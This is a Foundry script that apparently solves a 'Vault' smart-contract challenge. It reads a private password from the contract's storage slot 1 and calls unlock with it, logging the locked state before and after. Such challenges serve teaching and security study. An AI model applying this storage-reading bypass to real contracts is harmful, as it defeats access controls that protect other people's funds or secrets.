// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Vault.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract ValutSol is Script {
    Vault public vault_ = Vault(0xA8F0b1Bb0d8184FF37dd97d7BB797dD5d8F62d69);

    function run() external {
        vm.startBroadcast();

        console.log("Locked:", vault_.locked());
        vault_.unlock(vm.load(address(vault_), bytes32(uint256(1))));
        console.log("Locked:", vault_.locked());

        vm.stopBroadcast();
    }
}